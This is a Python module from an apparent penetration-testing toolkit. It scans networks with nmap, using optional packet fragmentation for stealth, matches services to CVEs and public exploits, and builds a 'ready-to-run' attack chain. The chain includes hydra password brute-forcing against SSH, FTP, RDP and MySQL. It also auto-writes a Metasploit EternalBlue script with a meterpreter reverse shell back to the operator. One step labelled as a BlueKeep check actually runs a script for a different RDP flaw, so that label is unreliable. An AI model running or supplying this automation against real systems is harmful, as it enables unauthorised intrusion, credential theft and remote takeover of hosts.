"""
Adaptive multi-phase network scanner.

Phase 1 — Host Discovery   : ARP (LAN) + ICMP + TCP-SYN ping sweep
Phase 2 — Port Scan        : Adaptive depth based on host count; nmap SYN scan
Phase 3 — Service/Version  : Banner grab + nmap -sV on live ports
Phase 4 — OS Detection     : nmap -O with fallback TTL/TCP fingerprinting
Phase 5 — Vulnerability    : nmap vulners NSE + searchsploit correlation
Phase 6 — Attack Chain     : scored, prioritised attack plan with ready-to-run cmds
"""

import asyncio
import ipaddress
import json
import os
import re
import socket
import subprocess
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field
from typing import AsyncGenerator, Optional

from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Network Intelligence",
    description=(
        "Six-phase adaptive scanner: discovers hosts, maps open ports, "
        "fingerprints services, detects OS, correlates CVEs, and generates "
        "a prioritised attack chain with ready-to-run exploit commands."
    ),
    usage=(
        "Provide a CIDR range or single IP. "
        "Phase depth adapts automatically: deep scan on ≤5 hosts, "
        "stealth mode on large ranges."
    ),
    danger_note="🟠 Medium Risk — SYN scan requires root. CVE phase is passive (local DB).",
    example="sudo python3 main.py  →  Network tab  →  enter 192.168.1.0/24",
)

DANGER = DangerLevel.ORANGE


# ── data models ──────────────────────────────────────────────────────────────

@dataclass
class ServiceInfo:
    port: int
    protocol: str       # tcp / udp
    state: str          # open / filtered
    name: str           # http, ssh, ftp …
    product: str        # Apache, OpenSSH …
    version: str        # 2.4.49, 7.6p1 …
    extra_info: str     # OS or extra banner
    cpe: str            # cpe:/a:apache:http_server:2.4.49


@dataclass
class HostResult:
    ip: str
    hostname: str = ""
    os_guess: str = ""
    os_confidence: int = 0
    ttl: int = 0
    mac: str = ""
    vendor: str = ""
    services: list[ServiceInfo] = field(default_factory=list)
    cves: list[dict] = field(default_factory=list)        # {id, score, desc, exploit}
    attack_chain: list[dict] = field(default_factory=list) # ordered attack steps


@dataclass
class ScanSession:
    target: str
    live_hosts: list[str] = field(default_factory=list)
    results: dict[str, HostResult] = field(default_factory=dict)  # ip → HostResult
    topology_edges: list[tuple[str, str]] = field(default_factory=list)
    gateway: str = ""
    local_ip: str = ""
    scan_xml: str = ""


# ── helpers ───────────────────────────────────────────────────────────────────

def _detect_local_network() -> tuple[str, str]:
    """Return (local_ip, gateway_ip) by reading the default route."""
    local_ip, gateway = "", ""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
    except Exception:
        pass
    try:
        out = subprocess.check_output(["ip", "route"], text=True)
        for line in out.splitlines():
            if line.startswith("default"):
                parts = line.split()
                if len(parts) >= 3:
                    gateway = parts[2]
                    break
    except Exception:
        pass
    return local_ip, gateway


def _cidr_from_ip(ip: str, prefix: int = 24) -> str:
    try:
        net = ipaddress.ip_interface(f"{ip}/{prefix}").network
        return str(net)
    except Exception:
        return ip + f"/{prefix}"


def _parse_nmap_xml(xml_path: str) -> dict[str, HostResult]:
    results: dict[str, HostResult] = {}
    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
    except Exception:
        return results

    for host_el in root.findall("host"):
        if host_el.find("status") is None:
            continue
        if host_el.find("status").get("state") != "up":
            continue

        ip = ""
        hostname = ""
        for addr in host_el.findall("address"):
            if addr.get("addrtype") == "ipv4":
                ip = addr.get("addr", "")
            elif addr.get("addrtype") == "mac":
                pass  # handled below
        if not ip:
            continue

        hr = HostResult(ip=ip)

        for addr in host_el.findall("address"):
            if addr.get("addrtype") == "mac":
                hr.mac = addr.get("addr", "")
                hr.vendor = addr.get("vendor", "")

        hostnames_el = host_el.find("hostnames")
        if hostnames_el is not None:
            for hn in hostnames_el.findall("hostname"):
                hr.hostname = hn.get("name", "")
                break

        os_el = host_el.find("os")
        if os_el is not None:
            best = None
            best_acc = 0
            for match in os_el.findall("osmatch"):
                acc = int(match.get("accuracy", 0))
                if acc > best_acc:
                    best_acc = acc
                    best = match.get("name", "")
            if best:
                hr.os_guess = best
                hr.os_confidence = best_acc

        ports_el = host_el.find("ports")
        if ports_el is not None:
            for port_el in ports_el.findall("port"):
                state_el = port_el.find("state")
                if state_el is None or state_el.get("state") not in ("open", "filtered"):
                    continue
                svc_el = port_el.find("service")
                svc = ServiceInfo(
                    port=int(port_el.get("portid", 0)),
                    protocol=port_el.get("protocol", "tcp"),
                    state=state_el.get("state", ""),
                    name=svc_el.get("name", "") if svc_el is not None else "",
                    product=svc_el.get("product", "") if svc_el is not None else "",
                    version=svc_el.get("version", "") if svc_el is not None else "",
                    extra_info=svc_el.get("extrainfo", "") if svc_el is not None else "",
                    cpe=svc_el.get("cpe", "") if svc_el is not None else "",
                )
                hr.services.append(svc)

                # Pull CVE data from nmap script output (vulners NSE)
                for script_el in port_el.findall("script"):
                    if script_el.get("id") in ("vulners", "vulscan"):
                        output = script_el.get("output", "")
                        for line in output.splitlines():
                            m = re.search(r'(CVE-\d{4}-\d+)\s+([\d.]+)', line)
                            if m:
                                hr.cves.append({
                                    "id": m.group(1),
                                    "score": float(m.group(2)),
                                    "desc": line.strip(),
                                    "port": svc.port,
                                    "service": svc.name,
                                    "exploit": False,
                                })

        results[ip] = hr
    return results


# ── main scanner class ────────────────────────────────────────────────────────

class NetworkScanner:

    def __init__(self, output_dir: str = "/tmp"):
        self.output_dir = output_dir
        self._runner = CommandRunner()
        self._session: Optional[ScanSession] = None

    # ── Phase 1: Host Discovery ──────────────────────────────────────────────

    async def discover_hosts(self, target: str) -> AsyncGenerator[str, None]:
        session = ScanSession(target=target)
        self._session = session

        local_ip, gateway = _detect_local_network()
        session.local_ip = local_ip
        session.gateway = gateway

        if not target:
            target = _cidr_from_ip(local_ip, 24)
            session.target = target
            yield f"[*] Auto-detected network: {target}"

        yield f"[*] ── Phase 1: Host Discovery ──"
        yield f"[*] Target: {target}  |  Local IP: {local_ip}  |  Gateway: {gateway}"

        xml_out = os.path.join(self.output_dir, "penkit_discovery")

        # ARP sweep first (faster, reliable on LAN)
        yield "[*] ARP sweep (LAN)..."
        async for line in self._runner.run([
            "nmap", "-sn", "-PR", "--open",
            "-oX", xml_out + "_arp.xml",
            target,
        ]):
            if "Nmap scan report" in line:
                ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                if ip_match:
                    ip = ip_match.group(1)
                    session.live_hosts.append(ip)
                    yield f"[+] Host up: {ip}"
            else:
                yield line

        # ICMP ping sweep for any missed hosts
        if not session.live_hosts:
            yield "[*] ARP found nothing — trying ICMP sweep..."
            async for line in self._runner.run([
                "nmap", "-sn", "-PE", "-PP", "--open",
                "-oX", xml_out + "_icmp.xml",
                target,
            ]):
                if "Nmap scan report" in line:
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        ip = ip_match.group(1)
                        if ip not in session.live_hosts:
                            session.live_hosts.append(ip)
                            yield f"[+] Host up: {ip}"

        count = len(session.live_hosts)
        yield f"[+] Discovery complete: {count} host(s) found"
        if count == 0:
            yield "[!] No hosts found. Check target range or try with sudo."

    # ── Phase 2 + 3 + 4 + 5: Deep Scan ─────────────────────────────────────

    async def deep_scan(self, stealth: bool = False) -> AsyncGenerator[str, None]:
        if not self._session or not self._session.live_hosts:
            yield "[ERROR] Run host discovery first."
            return

        session = self._session
        hosts = " ".join(session.live_hosts)
        count = len(session.live_hosts)

        yield f"[*] ── Phase 2-5: Deep Scan ({count} hosts) ──"

        xml_out = os.path.join(self.output_dir, "penkit_deep.xml")

        # Adapt scan depth and speed to host count
        if count <= 3:
            # Full deep scan: all ports, OS, scripts, vulners
            timing = "-T3" if stealth else "-T4"
            port_range = "-p-"
            script = "--script=vulners,banner,http-title,ssh-hostkey,ftp-anon,smb-security-mode,rdp-enum-encryption"
            yield f"[*] Mode: FULL DEEP (all 65535 ports + vuln scripts)"
        elif count <= 10:
            # Standard: top 1000 + important ports, version detection
            timing = "-T3" if stealth else "-T4"
            port_range = "--top-ports=1000"
            script = "--script=vulners,banner,http-title"
            yield f"[*] Mode: STANDARD (top 1000 ports + vulners)"
        else:
            # Fast sweep: top 100, minimal scripts
            timing = "-T2" if stealth else "-T3"
            port_range = "--top-ports=100"
            script = "--script=banner"
            yield f"[*] Mode: FAST SWEEP (top 100 ports, {count} hosts)"

        scan_flags = [
            "nmap",
            "-sS",          # SYN scan
            "-sV",          # service/version
            "-O",           # OS detection
            "--osscan-guess",
            timing,
            port_range,
            script,
            "--script-args=vulners.showall=true",
            "-oX", xml_out,
        ]

        if stealth:
            scan_flags += [
                "--data-length=25",   # randomise packet size
                "--max-retries=1",
                "-f",                 # fragment packets
            ]

        scan_flags += session.live_hosts

        yield f"[*] Running: {' '.join(scan_flags[:8])} ..."

        async for line in self._runner.run(scan_flags):
            if "Nmap scan report" in line:
                yield f"\n[*] Scanning: {line}"
            elif line.startswith("PORT") or "/tcp" in line or "/udp" in line:
                yield f"    {line}"
            elif "OS details" in line or "Running:" in line:
                yield f"[OS] {line}"
            elif "CVE-" in line:
                yield f"[!] {line}"
            elif line.strip():
                yield line

        session.scan_xml = xml_out
        session.results = _parse_nmap_xml(xml_out)
        yield f"\n[+] Deep scan complete — {len(session.results)} host(s) parsed"

    # ── Phase 6: Attack Chain ─────────────────────────────────────────────────

    async def generate_attack_chain(self) -> AsyncGenerator[str, None]:
        if not self._session or not self._session.results:
            yield "[ERROR] No scan results. Run deep scan first."
            return

        yield "[*] ── Phase 6: Attack Chain Generator ──"

        for ip, host in self._session.results.items():
            yield f"\n{'═'*60}"
            yield f"[TARGET] {ip}" + (f"  ({host.hostname})" if host.hostname else "")
            if host.os_guess:
                yield f"[OS]     {host.os_guess} ({host.os_confidence}% confidence)"
            if host.mac:
                yield f"[MAC]    {host.mac}  {host.vendor}"

            # Sort CVEs by score descending
            sorted_cves = sorted(host.cves, key=lambda c: c.get("score", 0), reverse=True)

            # Run searchsploit for each service
            for svc in host.services:
                if svc.product and svc.version:
                    yield f"\n[PORT {svc.port}/{svc.protocol}] {svc.product} {svc.version}"
                    async for line in self._searchsploit(svc.product, svc.version):
                        yield line
                elif svc.name:
                    yield f"\n[PORT {svc.port}/{svc.protocol}] {svc.name}"

            if sorted_cves:
                yield f"\n[CVEs] Top findings:"
                for cve in sorted_cves[:8]:
                    score = cve.get("score", 0)
                    severity = "CRITICAL" if score >= 9 else "HIGH" if score >= 7 else "MEDIUM" if score >= 4 else "LOW"
                    yield f"  [{severity}] {cve['id']} (CVSS {score}) — port {cve['port']}"

            # Generate concrete attack steps
            steps = self._build_attack_steps(ip, host)
            if steps:
                yield f"\n[ATTACK CHAIN] Recommended steps:"
                for i, step in enumerate(steps, 1):
                    yield f"  {i}. {step['name']} [{step['risk']}]"
                    yield f"     $ {step['cmd']}"

    async def _searchsploit(self, product: str, version: str) -> AsyncGenerator[str, None]:
        query = f"{product} {version}"
        try:
            proc = await asyncio.create_subprocess_exec(
                "searchsploit", "--color", query,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=8)
            output = stdout.decode(errors="replace")
            found = False
            for line in output.splitlines():
                if "No Results" in line or line.startswith("-") or not line.strip():
                    continue
                if "Exploit Title" in line:
                    continue
                found = True
                yield f"  [EXPLOIT] {line.strip()}"
            if not found:
                yield f"  [searchsploit] No public exploits for {query}"
        except asyncio.TimeoutError:
            yield f"  [searchsploit] Timeout for {query}"
        except FileNotFoundError:
            yield f"  [!] searchsploit not found (install: apt install exploitdb)"

    def _build_attack_steps(self, ip: str, host: HostResult) -> list[dict]:
        steps = []
        ports = {s.port: s for s in host.services if s.state == "open"}

        # SSH brute-force
        if 22 in ports:
            svc = ports[22]
            steps.append({
                "name": "SSH Password Spray",
                "risk": "🟠",
                "cmd": f"hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt {ip} ssh -t 4",
            })
            if svc.product and "OpenSSH" in svc.product:
                steps.append({
                    "name": f"Check OpenSSH {svc.version} CVEs",
                    "risk": "🟡",
                    "cmd": f"searchsploit openssh {svc.version}",
                })

        # HTTP/HTTPS enumeration
        for port in (80, 443, 8080, 8443, 8888):
            if port in ports:
                scheme = "https" if port in (443, 8443) else "http"
                steps.append({
                    "name": f"Directory Fuzzing ({scheme}:{port})",
                    "risk": "🟡",
                    "cmd": f"ffuf -u {scheme}://{ip}:{port}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403",
                })
                steps.append({
                    "name": f"Vulnerability Scan ({scheme}:{port})",
                    "risk": "🟡",
                    "cmd": f"nikto -h {scheme}://{ip}:{port}",
                })
                svc = ports[port]
                if "WordPress" in (svc.product + svc.extra_info):
                    steps.append({
                        "name": "WordPress Scan",
                        "risk": "🟠",
                        "cmd": f"wpscan --url {scheme}://{ip}:{port} --enumerate u,p,t --api-token YOUR_TOKEN",
                    })
                break

        # FTP anonymous
        if 21 in ports:
            steps.append({
                "name": "FTP Anonymous Login Check",
                "risk": "🟢",
                "cmd": f"ftp -n {ip} <<< $'quote USER anonymous\\nquote PASS anon@\\nls\\nquit'",
            })
            steps.append({
                "name": "FTP Brute-Force",
                "risk": "🟠",
                "cmd": f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{ip}",
            })

        # SMB enumeration
        if 445 in ports or 139 in ports:
            steps.append({
                "name": "SMB Null Session Enum",
                "risk": "🟡",
                "cmd": f"enum4linux -a {ip}",
            })
            steps.append({
                "name": "SMB Share List",
                "risk": "🟡",
                "cmd": f"smbclient -L //{ip}/ -N",
            })
            steps.append({
                "name": "EternalBlue Check (MS17-010)",
                "risk": "🔴",
                "cmd": f"nmap --script smb-vuln-ms17-010 -p 445 {ip}",
            })

        # RDP
        if 3389 in ports:
            steps.append({
                "name": "RDP Brute-Force",
                "risk": "🟠",
                "cmd": f"hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{ip}",
            })
            steps.append({
                "name": "BlueKeep Check (CVE-2019-0708)",
                "risk": "🔴",
                "cmd": f"nmap --script rdp-vuln-ms12-020 -p 3389 {ip}",
            })

        # MySQL
        if 3306 in ports:
            steps.append({
                "name": "MySQL Auth Bypass / Brute",
                "risk": "🟠",
                "cmd": f"hydra -l root -P /usr/share/wordlists/rockyou.txt {ip} mysql",
            })

        # Metasploit resource script
        if steps:
            res_path = f"/tmp/penkit_msf_{ip.replace('.', '_')}.rc"
            with open(res_path, "w") as f:
                f.write(f"# Auto-generated Metasploit resource script for {ip}\n")
                if 445 in ports:
                    f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
                    f.write(f"set RHOSTS {ip}\n")
                    f.write(f"set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                    f.write(f"set LHOST {self._session.local_ip if self._session else 'YOUR_IP'}\n")
                    f.write(f"exploit\n")
            steps.append({
                "name": "Load Metasploit Resource Script",
                "risk": "🔴",
                "cmd": f"msfconsole -r {res_path}",
            })

        return steps

    # ── Full Pipeline ─────────────────────────────────────────────────────────

    async def full_scan(self, target: str = "", stealth: bool = False) -> AsyncGenerator[str, None]:
        async for line in self.discover_hosts(target):
            yield line
        if self._session and self._session.live_hosts:
            async for line in self.deep_scan(stealth):
                yield line
            async for line in self.generate_attack_chain():
                yield line

    async def stop(self):
        await self._runner.stop()

    def get_session(self) -> Optional[ScanSession]:
        return self._session

    async def export_json(self, path: str = "/tmp/penkit_scan.json") -> str:
        if not self._session:
            return ""
        data = {
            "target": self._session.target,
            "hosts": {
                ip: {
                    "hostname": h.hostname,
                    "os": h.os_guess,
                    "services": [
                        {"port": s.port, "proto": s.protocol,
                         "name": s.name, "product": s.product, "version": s.version}
                        for s in h.services
                    ],
                    "cves": h.cves,
                }
                for ip, h in self._session.results.items()
            },
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        return path
